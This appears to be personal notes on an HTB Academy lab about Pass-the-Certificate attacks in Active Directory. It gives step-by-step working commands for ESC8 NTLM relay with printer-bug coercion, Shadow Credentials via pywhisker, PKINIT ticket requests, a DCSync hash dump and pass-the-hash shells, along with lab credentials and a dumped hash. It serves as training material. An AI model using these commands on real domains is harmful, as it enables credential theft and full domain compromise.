> `Pass-the-Certificate` refers to the technique of using X.509 certificates to successfully obtain `Ticket Granting Tickets (TGTs)`.

- Used primarily alongside [attacks against Active Directory Certificate Services (AD CS)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf), as well as in [Shadow Credential](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attacks.

## AD CS NTLM Relay Attack (ESC8)
- NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```shell-session
HrithikManoj000@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> **Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

- Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

```shell-session
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

![[Pasted image 20260301104231.png]]

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:

![[Pasted image 20260301105826.png]]

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

```shell-session
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

Then, we can begin the attack.

> **Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```shell-session
pip3 install -I git+https://github.com/wbond/oscrypto.git
```
```shell-session
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

![[Pasted image 20260301114221.png]]


Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```shell-session
export KRB5CCNAME=/tmp/dc.ccache
```

```shell-session
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```


## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

```shell-session
pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target Administrator --action add
```
![[Pasted image 20260301114424.png|697]]

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```shell-session
python3 gettgtpkinit.py -cert-pfx 5acZIz67.pfx -pfx-pass 'IiyeL4Pyfc8D4cSbI0w1' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

With the TGT obtained, we may once again `pass the ticket`:

```shell-session
export KRB5CCNAME=/tmp/jpinkman.ccache
```

In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

  Pass the Certificate

```shell-session
HrithikManoj000@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

## Make sure you add the ip to the etc/hosts file

```
echo "10.129.234.174 dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```
## Add this to /etc/krb5.conf to fix the winrm error

```
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = 10.129.234.174
        admin_server = 10.129.234.174
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
```

## No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks


## Lab

# Pass-the-Certificate Attack Notes

### HTB Academy — Password Attacks Module

---

## Environment

|Role|Hostname|IP|
|---|---|---|
|Attacker|HTB Pwnbox|10.10.15.108|
|Domain Controller|ACADEMY-PWATTCK-PTCDC01|10.129.234.174|
|Certificate Authority|ACADEMY-PWATTCK-PTCCA01|10.129.234.172|
|Domain|INLANEFREIGHT.LOCAL|—|

**Known credentials:** `wwhite / package5shores_topher1`

---

## Background: Key Concepts

### What is PKINIT?

PKINIT (Public Key Cryptography for Initial Authentication) is an extension to Kerberos that replaces password-based authentication with certificate-based authentication. Normally Kerberos proves identity using a password hash — PKINIT lets you prove identity using a private key and certificate instead.

```
Normal Kerberos:   "I know the password hash"  →  TGT issued
PKINIT Kerberos:   "I have the private key for this certificate"  →  TGT issued
```

If you possess a `.pfx` file for a user or machine account, you can authenticate as them via PKINIT without ever knowing their password.

### What is a .PFX file?

A `.pfx` (PKCS#12) file bundles together a certificate (public key + identity) and the matching private key, optionally protected by a password. Having a `.pfx` = having someone's complete authentication credential.

### What is msDS-KeyCredentialLink?

Every user and computer object in Active Directory has an attribute called `msDS-KeyCredentialLink`. This stores public keys that the KDC will accept for PKINIT authentication. If an attacker has **write access** to this attribute on a victim's account, they can add their own public key — creating a backdoor that allows them to authenticate as the victim without knowing their password. This is called a **Shadow Credentials** attack.

### What is DCSync?

Domain Controllers replicate their databases with each other constantly. An attacker who controls a DC machine account (e.g., `DC01$`) can impersonate a DC and request password replication from the real DC — dumping all NTLM hashes in the domain. This is called DCSync.

### What is ESC8?

ESC8 is a misconfiguration in AD CS (Active Directory Certificate Services) where the web enrollment interface (`/CertSrv`) operates over HTTP with NTLM authentication. This makes it vulnerable to NTLM relay attacks. An attacker can relay a machine account's NTLM authentication to the web enrollment page and obtain a certificate issued in that machine's name.

---

## Flag 1 — jpinkman's Desktop

**Attack used:** Shadow Credentials (`msDS-KeyCredentialLink` abuse)

**Why this worked:** `wwhite` had `AddKeyCredentialLink` write permission over `jpinkman`'s AD object. This allowed wwhite to add an attacker-controlled public key to jpinkman's trusted key list, then use the matching private key to obtain a TGT as jpinkman via PKINIT.

**Flag:** `3d7e3dfb56b200ef715cfc300f07f3f8`

### Attack Flow

```
wwhite has AddKeyCredentialLink permission on jpinkman
                    ↓
pywhisker generates RSA key pair + X.509 certificate
Writes public key to jpinkman's msDS-KeyCredentialLink
Saves certificate + private key as .pfx file
                    ↓
gettgtpkinit.py presents certificate to DC via PKINIT
DC checks jpinkman's msDS-KeyCredentialLink → key matches
DC issues TGT for jpinkman → saved as .ccache
                    ↓
export KRB5CCNAME → all Kerberos tools use jpinkman's TGT
                    ↓
evil-winrm connects to DC01 as jpinkman via WinRM (Kerberos)
                    ↓
type C:\Users\jpinkman\Desktop\flag.txt
```

### Step-by-Step Commands

**Step 1 — Add shadow credential to jpinkman**

```bash
pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL \
  -u wwhite -p 'package5shores_topher1' \
  --target jpinkman --action add
```

pywhisker authenticates as `wwhite`, generates a fresh RSA key pair and X.509 certificate, writes the public key into jpinkman's `msDS-KeyCredentialLink` attribute, and saves the certificate + private key as a `.pfx` file. Note the output `.pfx` filename and password.

**Step 2 — Fix oscrypto (if needed)**

```bash
pip install -I git+https://github.com/wbond/oscrypto.git
```

The PyPI version of oscrypto has a bug detecting OpenSSL versions. The GitHub version contains the fix. Only needed once per environment.

**Step 3 — Get TGT as jpinkman**

```bash
python3 gettgtpkinit.py \
  -cert-pfx 5acZIz67.pfx \
  -pfx-pass 'IiyeL4Pyfc8D4cSbI0w1' \
  -dc-ip 10.129.234.174 \
  INLANEFREIGHT.LOCAL/jpinkman \
  /tmp/jpinkman.ccache
```

Performs the PKINIT Kerberos exchange — signs the AS-REQ with the private key from the `.pfx`. DC verifies the key is in jpinkman's `msDS-KeyCredentialLink` and issues the TGT. Save the AS-REP encryption key printed in the output (useful for follow-on attacks).

**Step 4 — Activate the ticket**

```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist   # verify: should show jpinkman@INLANEFREIGHT.LOCAL
```

`KRB5CCNAME` tells all Kerberos-aware Linux tools which ticket cache to use. Once set, tools like evil-winrm automatically use jpinkman's TGT.

**Step 5 — Configure /etc/krb5.conf**

```bash
sudo nano /etc/krb5.conf
```

```ini
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = 10.129.234.174
        admin_server = 10.129.234.174
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
```

Evil-WinRM uses the system GSSAPI library for Kerberos auth. GSSAPI needs `krb5.conf` to know where `INLANEFREIGHT.LOCAL`'s KDC lives. Without this you get: `Cannot find KDC for realm "INLANEFREIGHT.LOCAL"`.

**Step 6 — Add DC to /etc/hosts**

```bash
echo "10.129.234.174 dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

Evil-WinRM connects by hostname. The Kerberos ticket is also tied to this hostname. Without DNS resolution the connection fails.

**Step 7 — Connect and read the flag**

```bash
evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
```

```powershell
type C:\Users\jpinkman\Desktop\flag.txt
# 3d7e3dfb56b200ef715cfc300f07f3f8
```

---

## Flag 2 — Administrator's Desktop

**Attack used:** ESC8 (NTLM Relay to AD CS Web Enrollment) → Pass-the-Certificate → DCSync → Pass-the-Hash

**Why this worked:** AD CS web enrollment was running over HTTP (not HTTPS), making it vulnerable to NTLM relay. By forcing `DC01$` to authenticate to our listener via the Printer Bug, then relaying that authentication to the CA's enrollment page, we obtained a certificate for `DC01$`. With DC01$'s certificate we got a TGT, then used DCSync to extract the Administrator NTLM hash.

**Administrator NTLM hash:** `fd02e525dd676fd8ca04e200d265f20c`

### Attack Flow

```
Two terminals required — relay listener and coercion run simultaneously

Terminal 1: ntlmrelayx listening on port 445
            relay target → CA01's /CertSrv enrollment page
                    ↓
Terminal 2: printerbug forces DC01$ to authenticate to us
            DC01$ → our port 445 → relayed to CA01
            CA01 issues certificate for DC01$
            ntlmrelayx saves DC01$.pfx
                    ↓
gettgtpkinit.py uses DC01$.pfx → TGT as DC01$ via PKINIT
                    ↓
export KRB5CCNAME → tools use DC01$'s TGT
                    ↓
impacket-secretsdump DCSync → dumps Administrator NTLM hash
                    ↓
evil-winrm with -H (Pass-the-Hash) → shell as Administrator
                    ↓
type C:\Users\Administrator\Desktop\flag.txt
```

### Step-by-Step Commands

**Step 1 — Start relay listener (Terminal 1, leave running)**

```bash
impacket-ntlmrelayx \
  -t http://10.129.234.172/certsrv/certfnsh.asp \
  --adcs \
  -smb2support \
  --template KerberosAuthentication
```

Listens on port 445 for inbound NTLM auth. When a connection arrives, relays it to CA01's web enrollment endpoint and requests a certificate using the `KerberosAuthentication` template (the template DCs use for authentication).

**Step 2 — Force DC01$ to authenticate to us (Terminal 2)**

```bash
cd ~/krbrelayx
python3 printerbug.py \
  INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.174 \
  10.10.15.108
```

Exploits the MS-RPRN Print Spooler protocol. Tells DC01 to subscribe to print notifications from our IP. DC01$'s machine account then attempts NTLM authentication back to us. The `RPC_S_SERVER_UNAVAILABLE` error in output is normal — the trigger still fires.

**Expected output in Terminal 1:**

```
[*] Authenticating against http://10.129.234.172 as INLANEFREIGHT/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

**Step 3 — Get TGT as DC01$**

```bash
cd ~/PKINITtools
python3 gettgtpkinit.py \
  -cert-pfx 'DC01$.pfx' \
  -dc-ip 10.129.234.174 \
  'inlanefreight.local/DC01$' \
  /tmp/dc01.ccache
```

No `-pfx-pass` needed — ntlmrelayx does not password-protect the certificates it generates.

**Step 4 — Activate DC01$'s ticket**

```bash
export KRB5CCNAME=/tmp/dc01.ccache
klist   # verify: should show DC01$@INLANEFREIGHT.LOCAL
```

**Step 5 — DCSync to dump Administrator's hash**

```bash
impacket-secretsdump \
  -k -no-pass \
  -dc-ip 10.129.234.174 \
  -just-dc-user Administrator \
  'INLANEFREIGHT.LOCAL/DC01$'@dc01.inlanefreight.local
```

Impersonates DC01$ to request AD replication from the real DC. The DC hands over the Administrator's credentials because it thinks it's talking to a legitimate DC peer.

```
Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
```

**Step 6 — Connect as Administrator (Pass-the-Hash) and read flag**

```bash
evil-winrm -i dc01.inlanefreight.local -u Administrator \
  -H fd02e525dd676fd8ca04e200d265f20c
```

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

Note: `-H` uses the NTLM hash directly (Pass-the-Hash) rather than Kerberos. No Kerberos ticket or password needed.

---

## Tools Reference

|Tool|Purpose|
|---|---|
|`pywhisker`|Write attacker's public key to victim's `msDS-KeyCredentialLink`|
|`gettgtpkinit.py`|Exchange `.pfx` certificate for Kerberos TGT via PKINIT|
|`impacket-ntlmrelayx`|Relay inbound NTLM auth to AD CS web enrollment|
|`printerbug.py`|Coerce machine account authentication via Print Spooler (MS-RPRN)|
|`impacket-secretsdump`|DCSync to dump domain password hashes|
|`evil-winrm`|WinRM shell using Kerberos ticket or NTLM hash|

---

## Why These Attacks Are Dangerous

|Property|Shadow Credentials|ESC8 + DCSync|
|---|---|---|
|Password required|Never|Never|
|Survives password reset|Yes — key persists in `msDS-KeyCredentialLink`|N/A — gives full domain hash dump|
|Detection difficulty|Hard — attribute changes often unmonitored|Moderate — relay traffic detectable|
|Requires misconfiguration|Write ACL on `msDS-KeyCredentialLink`|HTTP-based AD CS web enrollment|
|Impact|Account takeover|Full domain compromise|

---

## Common Errors & Fixes

|Error|Cause|Fix|
|---|---|---|
|`LibraryNotFoundError: Error detecting the version of libcrypto`|oscrypto PyPI version bug|`pip install -I git+https://github.com/wbond/oscrypto.git`|
|`OSError: [Errno 113] No route to host`|Wrong DC IP in command|Use `10.129.234.174`, not the walkthrough's example IP|
|`Cannot find KDC for realm`|`/etc/krb5.conf` missing or misconfigured|Add `INLANEFREIGHT.LOCAL` realm block to krb5.conf|
|`Check your /etc/hosts file`|DC hostname not resolvable|`echo "10.129.234.174 dc01.inlanefreight.local" \| sudo tee -a /etc/hosts`|
|`RPC_S_SERVER_UNAVAILABLE` in printerbug|Normal — not a real print server|Ignore — authentication trigger still fired|